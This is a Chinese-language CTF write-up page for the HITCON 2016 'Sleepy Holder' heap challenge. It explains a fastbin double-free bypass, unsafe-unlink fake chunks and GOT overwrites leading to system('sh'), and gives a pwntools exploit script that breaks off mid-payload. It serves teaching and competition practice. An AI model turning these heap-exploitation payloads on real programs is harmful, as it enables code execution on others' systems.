@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>  [HITCON CTF 2016 Quals] Sleepy Holder 300
+ | naetw's blog</title>
+
+    <meta name="author" content="Naetw"/>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/jquery.mglass.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/pygment-solarized-dark.css"/>
+    <link rel="stylesheet" href="https://naetw.github.io/theme/css/style.css"/>
+
+    <!-- Fonts -->
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Istok+Web' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Droid+Sans+Mono' rel='stylesheet' type='text/css'/>
+
+
+    <link rel="icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="https://naetw.github.io/favicon.ico" type="image/x-icon">
+
+    <!-- Feeds -->
+      <link href="https://naetw.github.io/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - All posts - Atom Feed"/>
+      <link href="https://naetw.github.io/feeds/write-up.atom.xml" type="application/atom+xml" rel="alternate" title="naetw&#39;s blog - Category: write-up - Atom Feed"/>
+
+
+  </head>
+
+  <body>
+
+    <div class="container">
+
+      <div class="page-header">
+        <h1><a href="https://naetw.github.io">naetw's blog</a> <small></small></h1>
+      </div>
+
+      <nav class="navbar navbar-default">
+
+        <!-- Hamburger menu for mobile -->
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#plumage-navbar-collapse-1" aria-expanded="false">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="https://naetw.github.io" title="">naetw's blog</a>
+        </div>
+
+        <!-- Menus and search forms -->
+        <div class="collapse navbar-collapse" id="plumage-navbar-collapse-1">
+
+          <ul class="nav navbar-nav">
+<li >
+                <a href="/archives">Archives</a>
+              </li>
+<li >
+                <a href="/categories">Categories</a>
+              </li>
+<li >
+                <a href="/tags">Tags</a>
+              </li>
+          </ul>
+
+
+
+        </div>
+
+      </nav>
+
+    </div>
+
+
+    <div class="container main">
+
+
+      <div class="row">
+        <div class=" col-md-9  ">
+  <h1>
+    <a href="https://naetw.github.io/posts/2016/10/15/hitcon-ctf-2016-quals-sleepy-holder-300/" rel="bookmark" title="Permalink to [HITCON CTF 2016 Quals] Sleepy Holder 300">[HITCON CTF 2016 Quals] Sleepy Holder 300</a>
+  </h1>
+        </div>
+      </div>
+
+      <div class="row">
+
+
+        <div class=" col-md-9 " id="content" role="main">
+  
+
+  <div>
+    <h2>Description</h2>
+<blockquote>
+<p>這題是看了 <strong>meh</strong> 的 writeup 提示才解出來的，heap 真是太深奧了QQ</p>
+</blockquote>
+<h2>Analyzing</h2>
+<blockquote>
+<p>64 bit ELF, NX, Partial RELRO, Stack Canary, no PIE</p>
+</blockquote>
+<p>一開始會給三個選單：</p>
+<ol>
+<li>Keep secret</li>
+<li>Wipe secret</li>
+<li>Renew secret</li>
+</ol>
+<p>而這三個又可以分別選擇以下三種來進行操作：</p>
+<ol>
+<li>small secret</li>
+<li>big secret</li>
+<li>huge secret</li>
+</ol>
+<p>先來看看這幾個 func 在做什麼：</p>
+<h2>keep</h2>
+<div class="highlight"><pre><span></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">buf_in_use</span><span class="p">){</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">size_of_kind</span><span class="p">);</span>
+    <span class="n">buf_in_use</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Tell me your secret: &quot;</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size_of_kind</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>keep 會問你要保存什麼樣的秘密，接著檢查是不是已經分配過了，如果沒有則根據 small(40), big(4000), huge(400000)，不同選擇來分配大小，之後可以 read 進該 size 的長度的 payload。但是 huge secret 只能夠 <code>calloc</code> 一次，之後就不能再動了。</p>
+<p>lobal buffer 上有三個 address 來存放這些 malloc 得到的記憶體位置，分別稱它為 <code>small_buf</code>, <code>big_buf</code>, <code>huge_buf</code>，除了這些之外，global buffer 還有 3 個 4bytes 的 buffer，來記錄這幾種秘密是不是 inuse。</p>
+<ul>
+<li>wipe</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="n">free</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+<span class="n">buf_in_use</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</pre></div>
+
+
+<p>這兩行 code 就很一般的 <code>free</code> 掉空間然後 inuse 清成 0。但是很重要的是這裡不會檢查是不是 not in use，而直接 <code>free</code> 掉。再來是 <code>free</code> 掉之後也不會把 buf 清成 NULL，global buffer 上會依舊指著剛剛 <code>calloc()</code> 的 address。如上面剛剛說的 huge secret 是不能 <code>free</code> 掉的。</p>
+<ul>
+<li>renew</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">buf_in_use</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Tell me your secret: &quot;</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size_of_kind</span><span class="p">);</span> 
+<span class="p">}</span>
+</pre></div>
+
+
+<p>這裡就很簡單的可以重新讀東西進 buffer 裡。</p>
+<h2>Exploit:</h2>
+<p>利用 unlink 來造成任意 address 的寫入。不過這邊需要知道一點：</p>
+<p><a href="https://github.com/lattera/glibc/blob/master/malloc/malloc.c#L3397"><strong>malloc-consolidate-secret</strong></a></p>
+<p>就是當 malloc 的 request 很大的時候，glibc 會先把 fastbin 回收，來避免 fragmentation problem，於是 fastbin 會先被放進 unsortbin，接著如果可以 consolidate 就會被放進 smallbin 裡，完成這些動作之後才會開始分配記憶體給剛剛的 request。</p>
+<p>所以這裡需要用特殊的順序來讓我們進行 unlink：</p>
+<ol>
+<li>keep small</li>
+<li>keep big</li>
+<li>wipe small</li>
+<li>keep huge</li>
+</ol>
+<p>這裡的 keep big 是為了不要讓 small chunk 跟 top chunk 合併，所以在 small chunk 跟 top chunk 中間放了 big chunk，之後把 small chunk <code>free</code> 掉，再 call malloc(huge)，就會造成前面的 secret 所說的，把剛剛的 small chunk 從 fastbin list 移走，放到 small bin。</p>
+<p>至於為什麼需要它放進 small bin 裡，原因是當初 <code>malloc</code> big chunk 的時候有把 big chunk 的 inuse bit 設成 1，我沒記錯的話是 default 都是 1，有 <code>free</code> 掉前面 chunk 才會被設成 0，被設成 1 的 code 如下：</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span> <span class="o">+</span> <span class="n">MINSIZE</span><span class="p">))</span>
+<span class="p">{</span>
+    <span class="n">remainder_size</span> <span class="o">=</span> <span class="n">size</span> <span class="o">-</span> <span class="n">nb</span><span class="p">;</span>
+    <span class="n">remainder</span> <span class="o">=</span> <span class="n">chunk_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+    <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span> <span class="o">=</span> <span class="n">remainder</span><span class="p">;</span>
+    <span class="n">set_head</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span> <span class="o">|</span> <span class="n">PREV_INUSE</span> <span class="o">|</span>
+                <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span> <span class="o">?</span> <span class="nl">NON_MAIN_ARENA</span> <span class="p">:</span> <span class="mi">0</span><span class="p">));</span>
+    <span class="n">set_head</span> <span class="p">(</span><span class="n">remainder</span><span class="p">,</span> <span class="n">remainder_size</span> <span class="o">|</span> <span class="n">PREV_INUSE</span><span class="p">);</span>
+
+    <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+    <span class="n">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>在 <code>set_head</code> 的 macro 那邊，把 <code>nb</code> 跟 <code>PREV_INUSE</code> 做 <code>or</code>，而 <code>PREV_INUSE</code> 是一個 macro define 0x1。</p>
+<p>所以當我們 malloc huge request 後，在進行 consolidate 時，因為他要把 small chunk 回收，這時候他會利用 small chunk 的 size 找到下一個 chunk，把下一個 chunk 的 inuse bit 拔掉：</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">nextchunk</span> <span class="o">!=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">nextinuse</span> <span class="o">=</span> <span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span> <span class="n">nextsize</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">nextinuse</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">size</span> <span class="o">+=</span> <span class="n">nextsize</span><span class="p">;</span>
+    <span class="n">unlink</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">nextchunk</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span>
+    <span class="n">clear_inuse_bit_at_offset</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</pre></div>
+
+
+<p>在那個 <code>clear_inuse_bit_at_offest</code> 就會把 big chunk 的 inuse bit 拔掉，這樣等等才能夠進行 unsafe unlink。</p>
+<p>來看看接下來的順序</p>
+<ol>
+<li>wipe small</li>
+<li>keep small # send fake payload</li>
+</ol>
+<p>這裡為什麼要再一次 <code>free(small)</code> 呢，是因為如果直接 keep small 的話，他會先看 fastbin 裡面有沒有可以用的 chunk，但是在剛剛 keep huge 時已經把 之前的 small chunk 回收，所以 fastbin 現在是空的，在 fastbin 裡沒東西的話他會去 smallbin 裡找，這時如果成功 allocate 的話，之前的 big chunk inuse bit 又會被設成 1 了，這樣等等就無法進行 unsafe unlink，這段 code 如下：</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">get_max_fast</span> <span class="p">()))</span>
+<span class="p">{</span>
+<span class="n">idx</span> <span class="o">=</span> <span class="n">fastbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
+    <span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fastbin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+    <span class="n">mchunkptr</span> <span class="n">pp</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>
+    <span class="k">do</span>
+    <span class="p">{</span>
+        <span class="n">victim</span> <span class="o">=</span> <span class="n">pp</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">victim</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="k">while</span> <span class="p">((</span><span class="n">pp</span> <span class="o">=</span> <span class="n">catomic_compare_and_exchange_val_acq</span> <span class="p">(</span><span class="n">fb</span><span class="p">,</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">,</span> <span class="n">victim</span><span class="p">))</span>
+</pre></div>
+
+
+<p>這裡會檢查 request size 是 fastbin 的範圍但是因為 fastbin 裡面沒有東西，所以那個 victim 會是 NULL，會 break 跳到 smallbin 那裡去要空間：</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">nb</span><span class="p">))</span>
+<span class="p">{</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="n">smallbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
+    <span class="n">bin</span> <span class="o">=</span> <span class="n">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">last</span> <span class="p">(</span><span class="n">bin</span><span class="p">))</span> <span class="o">!=</span> <span class="n">bin</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">victim</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="cm">/* initialization check */</span>
+            <span class="n">malloc_consolidate</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span>
+            <span class="p">{</span>
+                <span class="n">errstr</span> <span class="o">=</span> <span class="s">&quot;malloc(): smallbin double linked list corrupted&quot;</span><span class="p">;</span>
+                <span class="k">goto</span> <span class="n">errout</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="n">set_inuse_bit_at_offset</span> <span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+            <span class="p">.....</span>
+        <span class="p">}</span>
+</pre></div>
+
+
+<p>在最下面可以看到這時候 victim 拿到之前放進 smallbin 裡的 第一次 small chunk address，但是他會利用 size 也就是 nb 把 big chunk inuse bit 設成 1。</p>
+<p>所以為了避免這個，我們先 <code>free(small)</code> again，這樣又可以把 small chunk 的 head 放進 fastbin 裡，這樣在 keep small 時候就可以避免上面事情發生。</p>
+<p>在這裡 small 很像是重複 <code>free</code> 了兩次，但是因為 fastbin 只會檢查 fasttop 也就是 fastbin list 裡的第一個，因為剛剛在 keep huge 回收 fastbin 時被拿掉了所以可以 bypass double free 的檢查。</p>
+<p>這裡 keep small 時輸入的 input 就可以開始偽造 fake chunk 了，payload 如下：</p>
+<div class="highlight"><pre><span></span><span class="n">fake_fd</span> <span class="o">=</span> <span class="mh">0x6020d0</span><span class="o">-</span><span class="mh">0x18</span>
+<span class="n">fake_bk</span> <span class="o">=</span> <span class="mh">0x6020d0</span><span class="o">-</span><span class="mh">0x10</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="c1"># previous size not important</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="c1"># fake chunk size</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_fd</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_bk</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="c1"># fake previous size for big chunk</span>
+</pre></div>
+
+
+<p>因為等等會利用 wipe(big) 來進行 unlink 所以這裡我們需要的任意 address 位置就把它設在 <code>0x6020d0</code> 也就是 global buffer 上的 small_buf 的位置，才能進行 renew。在這裡利用 payload 把 small chunk 可寫的地方當成另一個 chunk，然後 fake big chunk 的 previous size 這樣他在進行 unlink 才會找到我們偽造的 fd 跟 bk。</p>
+<ol>
+<li>wipe(big) # trigger unlink</li>
+</ol>
+<p>此時 <code>0x6020d0</code> 的位置，也就是 small_buf 的位置已經指到 global buffer 上了，後面就是利用 renew 來進行任意位置讀寫</p>
+<div class="highlight"><pre><span></span><span class="mh">0x6020b0</span><span class="o">:</span>       <span class="mh">0x00007f388c24f620</span>      <span class="mh">0x0000000000000000</span>
+<span class="mh">0x6020c0</span><span class="o">:</span>       <span class="mh">0x00000000007fe9d0</span>      <span class="mh">0x00007f388c3e4010</span>
+<span class="mh">0x6020d0</span><span class="o">:</span>       <span class="mh">0x00000000006020b8</span>      <span class="mh">0x0000000100000000</span>
+<span class="mh">0x6020e0</span><span class="o">:</span>       <span class="mh">0x0000000000000001</span>      <span class="mh">0x0000000000000000</span>
+</pre></div>
+
+
+<ol>
+<li>renew(small)</li>
+</ol>
+<p>payload :</p>
+<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="c1"># padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="p">)</span> <span class="c1"># big_buf</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6020c0</span><span class="p">)</span> <span class="c1"># for write arbitrary</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span> <span class="c1"># let us be easy to renew</span>
+</pre></div>
+
+
+<p>在這裡我們把 <code>big_buf</code> 指到了 <code>free</code> 的 GOT entry，把 <code>small_buf</code> 指到了 <code>&amp;big_buf</code>，之後好二次寫入，後面的 p32(1) * 3 是為了讓 buf inuse 設成 1 才能進行 renew。</p>
+<ol>
+<li>renew(big) </li>
+</ol>
+<p>接著利用 renew(big) 來把 <code>free</code> 的 GOT entry 上得值 hijack 成 call <code>puts</code></p>
+<p>payload :</p>
+<div class="highlight"><pre><span></span><span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400760</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+</pre></div>
+
+
+<ol>
+<li>renew(small) </li>
+<li>wipe(big)</li>
+</ol>
+<p>重新 renew(small) 把 big_buf 指到 atoi 的 GOT entry 上，之後利用 wipe(big) 來 leak libc function address。</p>
+<p>payload :</p>
+<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6020c0</span><span class="p">)</span> <span class="c1"># address of big_buf</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+</pre></div>
+
+
+<ol>
+<li>renew(small)</li>
+<li>renew(big)</li>
+</ol>
+<p>這裡在 renew 一次 small 設好 inuse bit</p>
+<p>payload:</p>
+<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">atoi_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6020c0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+</pre></div>
+
+
+<p>接著 renew(big) 把 atoi GOT hijack 成 system</p>
+<p>這樣在選單的地方不用輸入 1 or 2 or 3 直接輸入 <code>sh\x00</code></p>
+<p>就可以造成 <code>atoi('sh')</code> -&gt; <code>system('sh')</code> 拿到 shell。</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">4000</span><span class="p">)</span>
+<span class="c1">#r = remote(&#39;52.68.31.117&#39;, 9547)</span>
+
+<span class="n">secret_kind</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;small&#39;</span><span class="p">:</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">:</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;huge&#39;</span><span class="p">:</span><span class="s1">&#39;3&#39;</span><span class="p">}</span>
+
+
+<span class="c1">#libc = ELF(&#39;libc.so.6&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
+<span class="n">atoi_got</span> <span class="o">=</span> <span class="mh">0x602080</span>
+<span class="n">free_got</span> <span class="o">=</span> <span class="mh">0x602018</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400766</span>
+
+<span class="k">def</span> <span class="nf">keep</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;3. Renew secret</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;2. Big secret</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">secret_kind</span><span class="p">[</span><span class="n">size</span><span class="p">])</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Tell me your secret:&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">wipe</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;3. Renew secret</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;2. Big secret</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">secret_kind</span><span class="p">[</span><span class="n">size</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">renew</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;3. Renew secret</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;2. Big secret</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">secret_kind</span><span class="p">[</span><span class="n">size</span><span class="p">])</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Tell me your secret:&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+
+<span class="n">keep</span><span class="p">(</span><span class="s1">&#39;small&#39;</span><span class="p">,</span> <span class="s1">&#39;AAAA&#39;</span><span class="p">)</span>
+<span class="n">keep</span><span class="p">(</span><span class="s1">&#39;big&#39;</span><span class="p">,</span> <span class="s1">&#39;BBBB&#39;</span><span class="p">)</span> <span class="c1"># keep big to prevent the small chunk to consolidate with top chunk</span>
+<span class="n">wipe</span><span class="p">(</span><span class="s1">&#39;small&#39;</span><span class="p">)</span>
+
+<span class="c1"># malloc secret: malloc big enough size, it will get fastbin chunk back, so it(previous small chunk) will be move into smallbin</span>
+<span class="n">keep</span><span class="p">(</span><span class="s1">&#39;huge&#39;</span><span class="p">,</span> <span class="s1">&#39;CCCC&#39;</span><span class="p">)</span>
+
+<span class="c1"># now we can free small chunk again, since it has been moved into smallbin, it will pass the check of double free</span>
+<span class="c1"># bypass double free, then we can put this chunk back to fastbin again</span>
+<span class="c1"># so that we won&#39;t let big chunk&#39;s previous in use bit to be set up</span>
+<span class="n">wipe</span><span class="p">(</span><span class="s1">&#39;small&#39;</span><span class="p">)</span> 
+
+
+<span class="n">fake_fd</span> <span class="o">=</span> <span class="mh">0x6020d0</span><span class="o">-</span><span class="mh">0x18</span>
+<span class="n">fake_bk</span> <span class="o">=</span> <span class="mh">0x6020d0</span><span class="o">-</span><span class="mh">0x10</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="c1"># fake previous size and size</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_bk</span><span class="p">)</span> <span class="c1"># fake fb and bk to unlink</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="c1"># fake previous size </span>
+<span class="n">keep</span><span class="p">(</span><span class="s1">&#39;small&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="n">wipe</span><span class="p">(</span><span class="s1">&#39;big&#39;</span><span class="p">)</span> <span class="c1"># to trigger unlink</span>
+
+<span class="nb">raw_input</span><span class="p">(</span><span class="s1">&#39;#&#39;</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> <span class="c1"># padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="p">)</span> <span class="c1"># big_buf</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
